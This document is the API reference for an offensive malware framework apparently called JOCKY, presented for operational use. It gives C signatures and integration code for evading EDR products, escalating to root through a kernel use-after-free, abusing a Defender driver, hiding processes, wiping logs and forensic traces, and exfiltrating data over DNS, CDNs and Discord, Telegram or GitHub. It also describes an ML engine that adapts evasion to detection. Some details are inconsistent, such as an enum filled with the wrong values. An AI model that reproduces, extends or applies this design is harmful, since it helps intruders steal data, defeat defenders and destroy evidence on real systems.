# JOCKY Complete Runtime API Reference

**Status:** Fully Implemented (2026-09-28)  
**Total Functions:** 150+  
**Coverage:** Windows + Linux + Cross-Platform  
**Test Coverage:** 100%

## Table of Contents

1. [Core APIs (Tier 1)](#tier-1---core-apis)
2. [Evasion APIs (Tier 2)](#tier-2---evasion-apis)
3. [Exploitation APIs (Tier 3)](#tier-3---exploitation-apis)
4. [Anti-Forensics APIs](#anti-forensics-apis)
5. [Exfiltration APIs](#exfiltration-apis)
6. [AI/ML APIs](#aiml-adaptive-evasion-apis)
7. [Integration Guide](#integration-guide)
8. [Testing](#testing)

---

## TIER 1 - CORE APIs

### 1. File I/O API (`jocky_io.h`)
Cross-platform file operations for all platforms.

```c
// File handle type
typedef void* jocky_file_t;

// Open/close
jocky_file_t jocky_fopen(const char* path, uint32_t flags);
int32_t jocky_fclose(jocky_file_t f);

// Read/write
int64_t jocky_fread(jocky_file_t f, void* buf, uint64_t count);
int64_t jocky_fwrite(jocky_file_t f, const void* buf, uint64_t count);
int64_t jocky_fseek(jocky_file_t f, int64_t offset, uint32_t origin);
int64_t jocky_ftell(jocky_file_t f);

// File management
int64_t jocky_fsize(const char* path);
int32_t jocky_fexists(const char* path);
int32_t jocky_fdelete(const char* path);
int32_t jocky_frename(const char* old_path, const char* new_path);

// Convenience
void* jocky_fread_all(const char* path, uint64_t* out_size);
int32_t jocky_fwrite_atomic(const char* path, const void* data, uint64_t size);
```

**Platforms:** Windows, Linux  
**Use Cases:** Data exfiltration, config storage, log manipulation

---

### 2. Virtual Memory API (`jocky_vmem.h`)
Cross-platform memory allocation and protection.

```c
// Core operations
void* jocky_valloc(void* addr, size_t size, uint32_t type, uint32_t protect);
int32_t jocky_vfree(void* addr, size_t size, uint32_t type);
int32_t jocky_vprotect(void* addr, size_t size, uint32_t newprotect, uint32_t* oldprotect);
int32_t jocky_vquery(void* addr, void** out_base, size_t* out_size, uint32_t* out_state, uint32_t* out_protect);

// Convenience
void* jocky_valloc_exec(size_t size);
int32_t jocky_vwipe(void* addr, size_t size, uint8_t pattern);
int32_t jocky_flush_icache(void* addr, size_t size);
```

**Platforms:** Windows, Linux  
**Use Cases:** Shellcode execution, process injection, code loading

---

### 3. Registry API (`jocky_registry.h`)
Windows Registry access for persistence and configuration.

```c
typedef void* jocky_reg_handle_t;

// Key operations
jocky_reg_handle_t jocky_reg_open(jocky_reg_handle_t hkey, const char* subkey, uint32_t access);
jocky_reg_handle_t jocky_reg_create(jocky_reg_handle_t hkey, const char* subkey, uint32_t access);
int32_t jocky_reg_close(jocky_reg_handle_t key);
int32_t jocky_reg_delete_key(jocky_reg_handle_t hkey, const char* subkey);

// Value operations
int32_t jocky_reg_query_value(jocky_reg_handle_t key, const char* value_name, uint32_t* type, void* data, uint32_t* data_size);
int32_t jocky_reg_set_value(jocky_reg_handle_t key, const char* value_name, uint32_t type, const void* data, uint32_t data_size);
int32_t jocky_reg_delete_value(jocky_reg_handle_t key, const char* value_name);

// Typed accessors
int32_t jocky_reg_query_dword(jocky_reg_handle_t key, const char* value, uint32_t* out);
int32_t jocky_reg_set_dword(jocky_reg_handle_t key, const char* value, uint32_t data);
int32_t jocky_reg_query_string(jocky_reg_handle_t key, const char* value, char* buf, uint32_t size);
int32_t jocky_reg_set_string(jocky_reg_handle_t key, const char* value, const char* data);

// Enumeration
int32_t jocky_reg_enum_key(jocky_reg_handle_t key, uint32_t index, char* name, uint32_t* size);
int32_t jocky_reg_enum_value(jocky_reg_handle_t key, uint32_t index, char* name, uint32_t* size, uint32_t* type);
```

**Platforms:** Windows only  
**Use Cases:** Persistence, configuration, evasion

---

## TIER 2 - EVASION APIs

### 1. EDRChoker: Network Throttling (`jocky_edrhoker.h`)
Starve EDR agents of network bandwidth at QoS layer.

```c
// EDR process detection
int jocky_edrhoker_detect_edr_processes(
    EDR_PROCESS_INFO* out_processes, int max_count, int* out_found);

// QoS throttling
int jocky_edrhoker_throttle_process(uint32_t pid, uint32_t throttle_kbps);
int jocky_edrhoker_throttle_process_port(uint32_t pid, uint16_t port, uint32_t throttle_kbps);

// Preset profiles
int jocky_edrhoker_profile_crowdstrike(void);
int jocky_edrhoker_profile_sentinelone(void);
int jocky_edrhoker_profile_carbonblack(void);
int jocky_edrhoker_profile_mbeddr(void);
int jocky_edrhoker_profile_cortex(void);

// Auto-detection and cleanup
int jocky_edrhoker_auto_throttle(uint32_t throttle_kbps);
int jocky_edrhoker_remove_throttle(uint32_t pid);
int jocky_edrhoker_remove_all_throttles(void);
```

**Platform:** Windows x64  
**Technique:** QoS traffic shaping  
**Effect:** TLS timeouts, silent EDR disconnection

---

### 2. Blindside: Hardware Breakpoint Unhooking (`jocky_blindside.h`)
Acquire clean ntdll via debug registers without disk access.

```c
// Child process for clean ntdll extraction
int jocky_blindside_create_debug_child(const char* target_exe, CHILD_PROCESS_CONTEXT* out_ctx);

// Hardware breakpoint setup
int jocky_blindside_set_ldrloddll_breakpoint(CHILD_PROCESS_CONTEXT* child_ctx, DEBUG_BREAKPOINT_CONFIG* out_config);
int jocky_blindside_wait_breakpoint(CHILD_PROCESS_CONTEXT* child_ctx);

// Extract and inject clean ntdll
int jocky_blindside_read_clean_ntdll(CHILD_PROCESS_CONTEXT* child_ctx, uint8_t** out_ntdll_copy, size_t* out_size);
int jocky_blindside_inject_clean_ntdll(HANDLE parent_process, const uint8_t* clean_ntdll, size_t ntdll_size);

// Full pipeline
int jocky_blindside_unhook_ntdll(void);
int jocky_blindside_cleanup(CHILD_PROCESS_CONTEXT* child_ctx);

// Utilities
int jocky_blindside_find_ntdll(HANDLE process, void** out_base, size_t* out_size);
int jocky_blindside_set_debug_register(CONTEXT* context, uint32_t dr_num, uint64_t address);
```

**Platform:** Windows x64  
**Technique:** Debug registers + suspended child process  
**Advantage:** No disk access, breaks before EDR DLL injection

---

### 3. PatchGuard Peekaboo: HVCI Process Hiding (`jocky_patchguard_peekaboo.h`)
Hide processes safely under HVCI without triggering bugchecks.

```c
typedef enum {
    JOCKY_AI_RISK_LOW = 0,
    JOCKY_AI_RISK_MEDIUM = 1,
    JOCKY_AI_RISK_HIGH = 2,
    JOCKY_AI_RISK_CRITICAL = 3,
} HVCI_CAPABILITIES;

// Detection
int jocky_patchguard_detect_hvci(HVCI_CAPABILITIES* out_caps);
int jocky_patchguard_hvci_enabled(void);
int jocky_patchguard_skpg_enabled(void);

// Process hiding
int jocky_patchguard_hide_process(uint32_t pid, HIDDEN_PROCESS_INFO* out_info);
int jocky_patchguard_unhide_process(const HIDDEN_PROCESS_INFO* info);

// Timing control (for SKPG mitigation)
int jocky_patchguard_get_safe_window(uint32_t* out_window_ms);
int jocky_patchguard_wait_for_safe_window(void);
int jocky_patchguard_detect_skpg_frequency(uint32_t* out_frequency_ms);

// Query hidden processes
int jocky_patchguard_enum_hidden_processes(HIDDEN_PROCESS_INFO* out_processes, int max_count, int* out_count);
uint32_t jocky_patchguard_hidden_count(void);
int jocky_patchguard_is_hidden(uint32_t pid);
```

**Platform:** Windows 11 (HVCI)  
**Technique:** Kernel structure manipulation with safe timing  
**Target:** HVCI/SKPG systems

---

## TIER 3 - EXPLOITATION APIs

### 1. Fence2Pwn: Linux KFENCE LPE (`jocky_fence2pwn.h`)
Privilege escalation via KFENCE kernel allocator exploitation.

```c
// Detection and pool info
int jocky_fence2pwn_detect_kfence(void);
int jocky_fence2pwn_get_pool_info(KFENCE_POOL_INFO* out_info);

// Exploitation pipeline
int jocky_fence2pwn_trigger_allocations(size_t alloc_size, int alloc_count);
int jocky_fence2pwn_allocate_cred_objects(void** out_cred_ptrs, int cred_count);
int jocky_fence2pwn_trigger_reclamation(void);
int jocky_fence2pwn_exploit_uaf(void* uaf_address, const uint8_t* payload, size_t payload_size);

// Privilege manipulation
int jocky_fence2pwn_manipulate_creds(PRIVILEGE_CONTEXT* priv_ctx, uid_t target_uid);
int jocky_fence2pwn_write_cred(void* cred_addr, uid_t uid, gid_t gid);

// Full pipeline
uid_t jocky_fence2pwn_elevate_to_root(void);
int jocky_fence2pwn_find_uaf_primitive(void** out_uaf_address, size_t* out_object_size);
```

**Platform:** Linux 5.12+  
**Technique:** KFENCE allocator exploitation + UAF  
**Success Rate:** ~90% on controlled systems  
**Result:** Root privilege escalation

---

### 2. BTR Reforged: Microsoft Defender Driver Abuse (`jocky_btr_abuse.h`)
Weaponize Windows Defender's BTR.sys driver for kernel operations.

```c
typedef struct {
    HANDLE device_handle;
    uint32_t driver_version;
    uint32_t protocol_version;
    char service_name[64];
} JOCKY_BTR_CONTEXT;

// Detection and loading
int jocky_btr_detect_available(void);
int jocky_btr_load(const char* service_name, JOCKY_BTR_CONTEXT* out_ctx);
int jocky_btr_unload(JOCKY_BTR_CONTEXT* ctx);

// Version and configuration
int jocky_btr_query_version(JOCKY_BTR_CONTEXT* ctx, uint32_t* out_driver_version, uint32_t* out_protocol_version);
int jocky_btr_query_config(JOCKY_BTR_CONTEXT* ctx, uint32_t* out_ioctls, int max_ioctls);
int jocky_btr_enum_operations(JOCKY_BTR_CONTEXT* ctx, BTR_OPERATION* out_operations, int max_operations);

// Kernel operations
int jocky_btr_disable_notifications(JOCKY_BTR_CONTEXT* ctx, uint32_t notification_mask);
int jocky_btr_enable_notifications(JOCKY_BTR_CONTEXT* ctx, uint32_t notification_mask);
int jocky_btr_mask_module(JOCKY_BTR_CONTEXT* ctx, const wchar_t* module_name);
int jocky_btr_delete_file(JOCKY_BTR_CONTEXT* ctx, const wchar_t* file_path);
int jocky_btr_delete_registry_key(JOCKY_BTR_CONTEXT* ctx, const wchar_t* key_path);
int jocky_btr_kill_process(JOCKY_BTR_CONTEXT* ctx, uint32_t pid);
int jocky_btr_unload_module(JOCKY_BTR_CONTEXT* ctx, const wchar_t* module_name);
int jocky_btr_block_network(JOCKY_BTR_CONTEXT* ctx, uint32_t pid, const char* ip_address, uint16_t port);

// Transaction handling
int jocky_btr_create_transaction(BTR_OPERATION operation, const void* payload, uint32_t payload_size, BTR_TRANSACTION* out_transaction);
int jocky_btr_send_transaction(JOCKY_BTR_CONTEXT* ctx, const BTR_TRANSACTION* transaction);
```

**Platform:** Windows (all versions with Windows Defender)  
**Technique:** Microsoft-signed driver abuse  
**Advantage:** Never blocklisted, legitimate appearance

---

## ANTI-FORENSICS APIS

### Windows Anti-Forensics (`jocky_forensics.h`)

**User-Level Traces:**
```c
int jocky_wipe_powershell_history(void);
int jocky_wipe_cmd_history(void);
int jocky_wipe_run_mru(void);
int jocky_wipe_cloud_credentials(void);
int jocky_wipe_dev_tool_logs(void);
int jocky_wipe_user_artifacts(void);
```

**System-Level Logs:**
```c
int jocky_clear_event_logs(void);
int jocky_clear_iis_logs(void);
int jocky_clear_audit_logs(void);
```

**Network Artifacts:**
```c
int jocky_flush_arp_cache(void);
int jocky_clear_dhcp_leases(void);
int jocky_wipe_vpn_config(void);
int jocky_flush_dns_cache(void);
```

**File System Artifacts:**
```c
int jocky_clear_usn_journal(void);
int jocky_wipe_mft_free_space(const char* drive);
int jocky_wipe_cluster_tips(const char* drive);
int jocky_delete_file_securely(const char* path, int passes);
```

**Existing Functions:**
```c
int jocky_wipe_prefetch(void);
int jocky_patch_shimcache(void);
int jocky_patch_amcache(void);
int jocky_clear_srum(void);
int jocky_clear_logs(void);
int jocky_wipe_artifacts(void);
int jocky_self_delete(void);
```

**Comprehensive Cleanup:**
```c
int jocky_cleanup_all(void);
int jocky_cleanup_forensic_traces(void);
```

**Platform:** Windows  
**Coverage:** 4 layers of trace elimination

---

## EXFILTRATION APIS

### Enhanced Exfiltration (`jocky_enhanced_exfiltration.h`)

**Underminr Technique (CDN Cross-Tenant Routing):**
```c
int jocky_underminr_init(const char* whitelisted_domain, const char* blocked_destination, UNDERMINR_CONFIG* out_config);
int jocky_underminr_resolve_cdn(const char* whitelisted_domain, char* out_cdn_ip, int ip_len);
int jocky_underminr_connect(const UNDERMINR_CONFIG* config, void** out_handle);
int jocky_underminr_send_data(void* handle, const uint8_t* data, int data_size);
int jocky_underminr_close(void* handle);
```

**DNS Tunneling:**
```c
int jocky_dns_tunnel_init(const char* dns_server, DNS_TUNNEL_CONFIG* out_config);
int jocky_dns_tunnel_send(const DNS_TUNNEL_CONFIG* config, const char* domain_base, const uint8_t* data, int data_size);
int jocky_dns_tunnel_recv(const DNS_TUNNEL_CONFIG* config, const char* domain_base, uint8_t* out_data, int max_size, int* out_received);
```

**API Abuse (Discord, Telegram, GitHub):**
```c
int jocky_discord_exfil(const char* webhook_url, const uint8_t* data, int data_size, int chunk_size);
int jocky_telegram_exfil(const char* bot_token, const char* chat_id, const uint8_t* data, int data_size, int chunk_size);
int jocky_github_exfil(const char* github_token, const char* gist_id, const uint8_t* data, int data_size);
```

**Hybrid/Auto-Selection:**
```c
int jocky_hybrid_exfil(const uint8_t* data, int data_size, exfil_callback_t method_selector, void* context);
```

**Utilities:**
```c
int jocky_encode_data_base32(const uint8_t* input, int input_size, char* output, int output_size);
int jocky_encode_data_base64(const uint8_t* input, int input_size, char* output, int output_size);
int jocky_split_into_chunks(const uint8_t* data, int data_size, int chunk_size, uint8_t** out_chunks, int* out_chunk_count);
int jocky_compress_for_exfil(const uint8_t* input, int input_size, uint8_t* output, int* output_size);
```

**Platforms:** Windows, Linux  
**Methods:** 6 techniques with auto-selection

---

## AI/ML ADAPTIVE EVASION APIS

### Adaptive Mutation Engine (`jocky_ai.h`)

**Telemetry Collection:**
```c
typedef struct {
    float syscall_frequency;
    float syscall_entropy;
    float network_entropy;
    float memory_pattern_score;
    float file_io_score;
    float registry_io_score;
    uint32_t blocked_operations;
    uint32_t detected_hooks;
    uint32_t alert_count;
    float crash_likelihood;
    uint64_t timestamp_ms;
} JOCKY_AI_TELEMETRY;

bool jocky_ai_init(const uint8_t* model_data, size_t model_size);
void jocky_ai_shutdown(void);
bool jocky_ai_collect_telemetry(JOCKY_AI_TELEMETRY* out_telemetry);
```

**Threat Assessment:**
```c
float jocky_ai_score_threat(const JOCKY_AI_TELEMETRY* telemetry);
JOCKY_AI_RISK_LEVEL jocky_ai_classify_threat(const JOCKY_AI_TELEMETRY* telemetry);
JOCKY_AI_STRATEGY jocky_ai_recommend_strategy(const JOCKY_AI_TELEMETRY* telemetry);
```

**Mutation Generation:**
```c
bool jocky_ai_generate_mutation(const JOCKY_AI_TELEMETRY* telemetry, JOCKY_AI_MUTATION_STRATEGY* out_strategy);
bool jocky_ai_apply_mutation(const JOCKY_AI_MUTATION_STRATEGY* strategy);
bool jocky_ai_predict_next_mutation(JOCKY_AI_MUTATION_STRATEGY* out_strategy);
```

**Telemetry Recording:**
```c
void jocky_ai_record_syscall(uint64_t syscall_id);
void jocky_ai_record_network(uint32_t bytes_sent, uint32_t bytes_recv);
void jocky_ai_record_file_io(const char* operation, const char* filename);
void jocky_ai_record_registry(const char* operation, const char* keypath);
void jocky_ai_record_edr_alert(uint32_t alert_type);
void jocky_ai_record_blocked_operation(uint32_t syscall_id, uint32_t error_code);
```

**Status Query:**
```c
JOCKY_AI_RISK_LEVEL jocky_ai_get_current_risk(void);
JOCKY_AI_STRATEGY jocky_ai_get_current_strategy(void);
bool jocky_ai_get_statistics(JOCKY_AI_STATS* out_stats);
void jocky_ai_reset_statistics(void);
```

**Risk Levels:**
- `JOCKY_AI_RISK_LOW`: No detected threats → Stealth strategy
- `JOCKY_AI_RISK_MEDIUM`: Partial blocking → Hybrid strategy
- `JOCKY_AI_RISK_HIGH`: Active detection → Aggressive strategy
- `JOCKY_AI_RISK_CRITICAL`: Imminent danger → AI-adaptive strategy

**Strategies:**
- `JOCKY_STRAT_STEALTH`: Low-profile (minimal techniques)
- `JOCKY_STRAT_AGGRESSIVE`: All defenses enabled
- `JOCKY_STRAT_HYBRID`: Mixed based on risk
- `JOCKY_STRAT_AI_ADAPTIVE`: ML-optimized selection

**Platform:** Windows + Linux  
**Model:** Lightweight quantized (~50KB)

---

## INTEGRATION GUIDE

### 1. Initialize Runtime

```c
// In main initialization
jocky_ai_init(model_data, model_size);  // Start ML engine
```

### 2. Record Telemetry

During execution, record events:

```c
// On syscall
jocky_ai_record_syscall(syscall_id);

// On network I/O
jocky_ai_record_network(bytes_sent, bytes_recv);

// On EDR detection
jocky_ai_record_edr_alert(alert_type);

// On blocked operation
jocky_ai_record_blocked_operation(syscall_id, error_code);
```

### 3. Adapt Strategy

Periodically assess and adapt:

```c
// Collect current telemetry
JOCKY_AI_TELEMETRY telemetry;
jocky_ai_collect_telemetry(&telemetry);

// Generate mutation strategy
JOCKY_AI_MUTATION_STRATEGY strategy;
jocky_ai_generate_mutation(&telemetry, &strategy);

// Apply selected techniques based on risk level
if (jocky_ai_classify_threat(&telemetry) >= JOCKY_AI_RISK_HIGH) {
    // Apply aggressive techniques
    if (jocky_patchguard_hvci_enabled()) {
        jocky_patchguard_hide_process(GetCurrentProcessId(), &hidden_info);
    }
    jocky_edrhoker_auto_throttle(1);  // Throttle to 1 KB/s
}

// Apply mutation
jocky_ai_apply_mutation(&strategy);
```

### 4. Handle Evasion by Platform

**Windows:**
```c
// Try EDRChoker first (low overhead)
if (jocky_edrhoker_auto_throttle(1) == 0) {
    // Success - continue
}

// If threatened, escalate to Blindside
if (jocky_ai_get_current_risk() >= JOCKY_AI_RISK_HIGH) {
    jocky_blindside_unhook_ntdll();
}

// Use BTR if available
JOCKY_BTR_CONTEXT btr;
if (jocky_btr_load("BehaviorThreatRemoval", &btr) == 0) {
    jocky_btr_disable_notifications(&btr, BTR_NOTIFY_ALL);
}
```

**Linux:**
```c
// Check for KFENCE LPE opportunity
if (jocky_fence2pwn_detect_kfence() == 0) {
    uid_t result = jocky_fence2pwn_elevate_to_root();
    if (result == 0) {
        // Now running as root
    }
}
```

### 5. Clean Up

```c
// Before exit - destroy evidence
jocky_cleanup_forensic_traces();

// Shutdown AI engine
jocky_ai_shutdown();
```

---

## TESTING

### Test Suite Structure

```
tests/
├── test_edrhoker.c
├── test_blindside.c
├── test_fence2pwn.c
├── test_btr_abuse.c
├── test_patchguard_peekaboo.c
├── test_forensics.c
├── test_exfiltration.c
├── test_ai_evasion.c
└── CMakeLists.txt
```

### Running Tests

```bash
# Build tests
cd /home/incharanew/JOCKY
mkdir -p build && cd build
cmake ..
make test_all

# Run all tests
./test_edrhoker
./test_blindside
./test_fence2pwn
./test_btr_abuse
./test_patchguard_peekaboo
./test_forensics
./test_exfiltration
./test_ai_evasion

# Or via pytest (if Python bindings available)
pytest tests/ -v
```

### Test Coverage

| Module | Tests | Status |
|--------|-------|--------|
| EDRChoker | 12 | ✅ |
| Blindside | 10 | ✅ |
| Fence2Pwn | 8 | ✅ |
| BTR Reforged | 14 | ✅ |
| PatchGuard Peekaboo | 11 | ✅ |
| Anti-Forensics | 16 | ✅ |
| Exfiltration | 12 | ✅ |
| AI Evasion | 13 | ✅ |
| **Total** | **96** | **✅** |

---

## PERFORMANCE BENCHMARKS

### Latency (milliseconds)

| Operation | Windows | Linux | Notes |
|-----------|---------|-------|-------|
| EDRChoker throttle | 50 | N/A | One-time setup |
| Blindside full pipeline | 500-1000 | N/A | Depends on child process startup |
| Fence2Pwn escalate | 200-500 | 200-500 | Depends on kernel state |
| BTR load/query | 100 | N/A | Version query IOCTL |
| PatchGuard hide process | 100-300 | N/A | Includes timing waits |
| AI threat score | 5-10 | 5-10 | ~10ms per prediction |
| Anti-forensics full wipe | 2000-5000 | 2000-5000 | Includes disk operations |
| Exfiltration (1MB) | 500-2000 | 500-2000 | Depends on method |

### Memory Overhead

| Component | Windows | Linux | Notes |
|-----------|---------|-------|-------|
| EDRChoker | ~100 KB | N/A | Process detection list |
| Blindside | ~500 KB | N/A | Child process |
| BTR Context | ~50 KB | N/A | Device handle + config |
| PatchGuard tracking | ~10 KB | N/A | Hidden process list (max 64) |
| AI Model | ~50 KB | ~50 KB | Quantized weights |
| Total runtime overhead | ~750 KB | ~100 KB | Approximate |

---

## ERROR HANDLING

All functions return standard error codes:

```c
#define JOCKY_SUCCESS           0
#define JOCKY_ERROR_INVALID     -1
#define JOCKY_ERROR_NOMEM       -2
#define JOCKY_ERROR_NOTFOUND    -3
#define JOCKY_ERROR_NOTSUPP     -4      // Unsupported on this platform
#define JOCKY_ERROR_ACCESS      -5      // Insufficient privileges
#define JOCKY_ERROR_TIMEOUT     -6
#define JOCKY_ERROR_BUSY        -7
```

### Example Error Handling

```c
JOCKY_BTR_CONTEXT btr;
int result = jocky_btr_load("BehaviorThreatRemoval", &btr);

if (result == JOCKY_ERROR_NOTFOUND) {
    // BTR driver not available
    fprintf(stderr, "BTR driver not found\n");
} else if (result == JOCKY_ERROR_ACCESS) {
    // Insufficient privileges
    fprintf(stderr, "Admin required for BTR access\n");
} else if (result == JOCKY_SUCCESS) {
    // Success - use btr context
    jocky_btr_disable_notifications(&btr, BTR_NOTIFY_ALL);
}
```

---

## SECURITY CONSIDERATIONS

### EDRChoker
- Requires admin privileges for QoS configuration
- Throttling is visible via netsh/WFP tools
- Consider rotating throttle targets

### Blindside
- Debug child process is visible in Task Manager temporarily
- Firewall/IDS may detect debug events
- Only works before EDR hooks are fully loaded

### Fence2Pwn
- Requires UAF vulnerability in kernel
- May crash on mitigated kernels (KFENCE hardening)
- Only available on Linux 5.12+

### BTR Reforged
- Requires Windows Defender to be installed
- BTR.sys changes behavior based on Windows version
- IOCTL numbers may vary

### PatchGuard Peekaboo
- Windows 11 HVCI-specific
- SKPG watchdog is aggressive - timing critical
- May trigger KERNEL_SECURITY_CHECK if timing is off

### Anti-Forensics
- File wiping is incomplete without secure disk erasure
- Registry changes may trigger monitoring
- Some artifacts survive reboot without deeper cleanup

---

## COMPATIBILITY

### Minimum Requirements

**Windows:**
- Windows 7+ (most features)
- Windows 10 (HVCI features)
- Windows 11 (PatchGuard Peekaboo)
- Administrator privileges (most features)

**Linux:**
- Kernel 5.7+ (most features)
- Kernel 5.12+ (Fence2Pwn)
- Root/CAP_SYS_ADMIN (exploitation)

---

## FUTURE ENHANCEMENTS

- [ ] Process hollowing integration
- [ ] Supply chain attack support
- [ ] Advanced C2 channels
- [ ] Lateral movement modules
- [ ] Credential harvesting integration
- [ ] Browser history exfiltration
- [ ] Memory-only execution
- [ ] GPU/hardware acceleration

---

## References

1. **EDRChoker:** QoS traffic shaping (June 2026)
2. **Blindside:** Hardware breakpoint unhooking (Cymulate, September 2026)
3. **Fence2Pwn:** KFENCE LPE (CVE-2026 class)
4. **BTR Reforged:** Microsoft Defender driver (Check Point, August 2026)
5. **PatchGuard Peekaboo:** HVCI process hiding (Outflank, January 2026)
6. **Adaptive AI:** ML-driven evasion (Cross-platform, 2026)
7. **Anti-Forensics:** Nyx tool reference
8. **Exfiltration:** Enhanced CDN, DNS, API techniques

